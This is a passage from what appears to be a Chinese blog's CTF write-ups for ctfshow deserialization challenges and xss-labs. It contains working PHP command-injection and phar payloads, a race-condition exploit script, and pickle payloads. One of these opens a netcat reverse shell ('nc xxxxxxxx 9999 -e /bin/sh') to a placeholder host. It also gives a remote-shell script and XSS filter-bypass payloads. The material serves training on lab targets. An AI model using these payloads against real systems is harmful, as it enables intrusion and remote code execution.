class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__destruct</code>方法有<code>system</code>函数, 而filename可控(传入fn-&gt;f-&gt;filename), 只需要满足<code>checkevil</code>中的任意一个方法即可RCE</p><p>利用分号闭合前面的rm命令即可执行新的命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?fn=php;ls</span><br></pre></td></tr></table></figure><p>发现回显当前目录文件, 直接拿到flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?fn=php;tac flag.php</span><br></pre></td></tr></table></figure><p>还可以条件竞争</p><h2 id="web276"><a class="header-anchor" href="#web276">¶</a>web276</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>没有反序列化的入口, 但是可以利用``file_put_content<code>配合phar伪协议不通过</code>unserialize()`直接进行反序列化</p><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a>, <a href="https://www.freebuf.com/articles/web/305292.html">浅析Phar反序列化</a></p><blockquote><p>如果要生成phar文件, 你得先修改<code>php.ini</code>文件, 将<code>phar.readonly</code>设置为<code>Off</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/1637308824_61975998719c7c61c06c1.png!small" alt="img"></p><p>先生成phar文件, 然后尝试上传:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$fn</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="string">&#x27;1;tac fla?.ph?&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// # 下面是通用的格式</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">// $phar = startBuffering();我这里加上会报错, 所以删了</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="comment">// $phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure><p>然后是官方脚本, 运行即可拿到flag, 记得放在同一目录下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 获取phar文件数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>(<span class="params">phar</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(phar,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入phar文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writePhar</span>(<span class="params">url, data</span>):</span><br><span class="line">    requests.post(url, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlinkPhar</span>(<span class="params">url, data</span>):</span><br><span class="line">    <span class="keyword">global</span>  success</span><br><span class="line">    r = requests.post(url, data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r <span class="keyword">and</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        success =<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    url = <span class="string">&#x27;http://aa8d9ac3-04f5-4cff-8749-dea43ea98613.challenge.ctf.show/&#x27;</span></span><br><span class="line">    phar = getPhar(<span class="string">&#x27;phar.phar&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        w = threading.Thread(target=writePhar, args=(url+<span class="string">&#x27;?fn=1.phar&#x27;</span>, phar))</span><br><span class="line">        s = threading.Thread(target=unlinkPhar, args=(url+<span class="string">&#x27;?fn=phar://1.phar/1.txt&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        w.start()</span><br><span class="line">        s.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="web277"><a class="header-anchor" href="#web277">¶</a>web277</h2><ul><li>描述: 同上</li></ul><p>查看源码发现提示:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">where is flag?<span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeauDf2wG42x7IK%3Dx&amp;u_atoken=2361055f45d5907d714ed9c29ef86c6f&amp;u_asession=018DBBN4oVDcaX0YS2HUy5DIX3TmfPytv9B4mCvpqSsGngznbYpnD-k1UJBVNDzYaNJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&amp;u_asig=05-Hj9KfutJbaxlPCP0Cib0dP325bb9BSj9xY86prxG-920q0rCEczJ5GjECLRZsC6fOGuLyw73fRtHuql6ggnOZvXnPUgnQ_eHtzs7pE-UFvHlf-kjV0X__ofIJZinoIyEC-bEYZboQ5kET1sNOuGu0ndzgloVNBFTX3VduWqHy_BzhvSc0Kr8URjOX9Xe4tklsD_AB5deAExdBRGrRqiygoyG7vjEHi5PVzyn7NwcU8ibV245QJTZIAHledXpn1x4xXkvGcZx_6k2MjOBZWSFm8VK7Cx_fyNxyJl0GHFVRB6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&amp;u_aref=uh9DU4aby7f3iAtT%2B906boH2QhU%3D#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickle反序列化初探</a>, pickle是python下的序列化与反序列化包, 以下是一个简单的例子:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aclass</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this is a class&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常调用</span></span><br><span class="line">test = aclass()</span><br><span class="line">test.p()</span><br><span class="line"><span class="comment"># 序列化和反序列化后</span></span><br><span class="line">test_ser = pickle.dumps(test)</span><br><span class="line"><span class="built_in">print</span>(test_ser)</span><br><span class="line">test_unser = pickle.loads(test_ser)</span><br><span class="line">test_unser.p()</span><br></pre></td></tr></table></figure><p>我们利用<code>__reduce__</code>反序列化后自动执行我们构造的命令, 由于题目没有回显, 只能反弹shell或者外带</p><blockquote><p>os.system没有导入, 所以用的eval</p></blockquote><p>反弹shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxxxxxxx 9999 -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">c = cmd()</span><br><span class="line">c = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(c))</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/backdoor?data=...</span><br></pre></td></tr></table></figure><p>dns外带: 没成功</p><p>还有大佬提供的虚拟终端脚本, 先镶起来以后再看</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">command: <span class="built_in">str</span>, arg: <span class="built_in">str</span></span>):</span><br><span class="line">    url = <span class="string">&quot;http://39995c7b-513e-4c09-9e77-01499da948bc.challenge.ctf.show/&quot;</span>  <span class="comment"># 以/结尾</span></span><br><span class="line">    payload = <span class="string">f&#x27;&#x27;&#x27;cos\n<span class="subst">&#123;command&#125;</span>\n(S&#x27;<span class="subst">&#123;arg&#125;</span>&#x27;\ntR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">    params = &#123;<span class="string">&quot;r&quot;</span>: <span class="string">&quot;test/ss&quot;</span>, <span class="string">&quot;data&quot;</span>: base64.b64encode(payload).decode()&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url+<span class="string">&quot;backdoor&quot;</span>, params=params)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url+<span class="string">&quot;static/1&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入命令...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="string">&quot;system&quot;</span></span><br><span class="line">        arg = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        arg = <span class="string">f&#x27;mkdir -p /app/static &amp;&amp; <span class="subst">&#123;arg&#125;</span> &gt; /app/static/1&#x27;</span></span><br><span class="line">        res = <span class="built_in">round</span>(command, arg + <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="web278"><a class="header-anchor" href="#web278">¶</a>web278</h2><ul><li>描述: 过滤了os.system</li></ul><p>上题用的os.popen, 所以可以继续用</p><p>大佬脚本同理, 改system为popen即可</p><h3 id="附"><a class="header-anchor" href="#附">¶</a>附</h3><p>绕过os可以用另一种:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cbuiltins\ngetattr\np0\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntRp1\n(cbuiltins\nglobals\n)RS&#x27;__builtins__&#x27;\ntRp2\n0g0\n(g2\nS&#x27;eval&#x27;\ntR(S&#x27;whoami&#x27;\ntR.</span><br></pre></td></tr></table></figure><p>本质就是通过<code>getattr</code>函数获取<code>builtins</code>模块中<code>dict</code>类的<code>get</code>方法，然后执行<code>globals()</code>，其返回值是一个<code>dict</code>，所以可以用刚刚得到的<code>get</code>方法获取内部的值，这里选择取出<code>builtins</code>模块本身的引用。等价于执行<code>dict.get(globals(),'__builtins__')</code>，利用该引用，就能获取到<code>builtins</code>模块内部的<code>eval</code>方法，再压栈想要执行的命令，然后R指令执行，<code>.</code>是结束符</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP原生类 </tag>
            
            <tag> 反序列化字符串逃逸 </tag>
            
            <tag> session反序列化漏洞 </tag>
            
            <tag> PHP指针 </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> pickle反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs</title>
      <link href="/article/xss-labs/"/>
      <url>/article/xss-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>xss-labs</h1><h2 id="level1"><a class="header-anchor" href="#level1">¶</a>level1</h2><p>在url直接输入即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a class="header-anchor" href="#level2">¶</a>level2</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:4<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以从第五行处进行利用, 闭合前面的语句即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>本机上检查源码发现第三行利用的函数为<code>htmlspecialchars</code>, 很可惜没成</p><p>还可以构造onclick属性, 因为是<code>&lt;input&gt;</code>标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level2.php?keyword=&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>此时文本框有了一个点击事件, 点击文本框就能看到弹窗进入下一关</p><h2 id="level3"><a class="header-anchor" href="#level3">¶</a>level3</h2><p><code>&lt;input&gt;</code>标签继续尝试:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level3.php?keyword=&#x27; onclick=&#x27;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><p>点击搜索框即可</p><blockquote><p>双引号被编码</p></blockquote><h2 id="level4"><a class="header-anchor" href="#level4">¶</a>level4</h2><p>还是可以直接用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 点击搜索框</span><br><span class="line">level4.php?keyword=&quot; onclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br><span class="line"># 点击搜索</span><br><span class="line">level4.php?keyword=&#x27;&quot; onblur=&#x27;alert(1)&#x27;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><h2 id="level5"><a class="header-anchor" href="#level5">¶</a>level5</h2><p>对事件on做了过滤, 同时过滤了script, 增加了_使得它们失效</p><p>试试<code>&lt;a&gt;</code>标签, 发现是可以塞进去的, 只过滤了script</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level5.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(1);&#x27;&gt;cnm&lt;/a&gt;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><h2 id="level6"><a class="header-anchor" href="#level6">¶</a>level6</h2><p>可以大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level6.php?keyword=&quot; Onclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br><span class="line">level6.php?keyword=&quot;&gt;&lt;a Href=&#x27;javascript:alert(1);&#x27;&gt;cnm&lt;/a&gt;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><h2 id="level7"><a class="header-anchor" href="#level7">¶</a>level7</h2><p>尝试利用下面的payload发现on被替换为空:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>尝试双写, 成功绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level7.php?keyword=&quot; oonnclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure><h2 id="level8"><a class="header-anchor" href="#level8">¶</a>level8</h2><p>内容输出在了a标签的href属性中, javascript不仅加了<code>_</code>, 并且将特殊符号进行了编码无法闭合</p><p>但是属性值是可以进行编码绕过的, 进行一个html的实体编码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;</span><br></pre></td></tr></table></figure><blockquote><p>hex编码也可以</p><p><code>javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)</code></p></blockquote><p>输入到输入框再点击友情链接即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level8.php?keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2334%3B%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B%26%2334%3B%26%2341%3B&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5</span><br></pre></td></tr></table></figure><h2 id="level9"><a class="header-anchor" href="#level9">¶</a>level9</h2><p><a href="https://www.matools.com/code-convert-unicode">unicode编码</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ 